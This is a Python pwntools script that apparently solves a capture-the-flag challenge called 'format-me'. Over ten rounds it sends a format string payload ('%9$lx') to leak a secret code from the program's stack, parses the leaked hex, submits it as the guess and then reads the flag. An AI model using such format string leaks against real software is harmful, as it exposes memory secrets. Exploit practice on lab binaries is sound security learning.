#!/usr/bin/env python3
from pwn import *
import re

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./format-me")

# start the process
r = process([exe.path])
# r = gdb.debug([exe.path])

# Known positional index (from gdb):
K = 9

for round_no in range(1, 11):
    # wait for the Recipient prompt
    r.recvuntil(b"Recipient? ")

    # request the single stack slot that contains the code
    fmt = f"%{K}$lx".encode()
    r.sendline(fmt)

    # read until the program prompts for the guess
    out = r.recvuntil(b"Guess? ", timeout=4)

    # extract the hex token printed between "Sending to " and "...\n"
    sent_idx = out.find(b"Sending to ")
    if sent_idx != -1:
        start = sent_idx + len(b"Sending to ")
        end_idx = out.find(b"...", start)
        if end_idx != -1:
            leaked = out[start:end_idx].strip()
        else:
            leaked = out[start:].strip()
    else:
        # fallback to searching the whole output
        leaked = out

    # If the leak contains separators (like pipes), take the last token
    # (in case the program prints extra text). Otherwise use the whole leaked string.
    if b'|' in leaked:
        toks = leaked.split(b'|')
        tok = toks[-1].strip() if toks else leaked.strip()
    else:
        # remove any non-hex trailing characters
        m2 = re.search(rb'([0-9a-fA-F]+)', leaked)
        tok = m2.group(1) if m2 else leaked

    try:
        code_val = int(tok, 16)
    except Exception:
        log.failure(f"Round {round_no}: failed to parse hex token from leak: {leaked!r}")
        r.close()
        break
    log.info(f"Round {round_no}: leaked code = {hex(code_val)} -> sending {code_val}")

    # send numeric guess (decimal expected by scanf)
    r.sendline(str(code_val).encode())

    # wait for confirmation of correct guess
    r.recvuntil(b"Correct", timeout=10)

# after 10 correct guesses the flag is printed
r.recvuntil(b"Here's your flag: ")
r.interactive()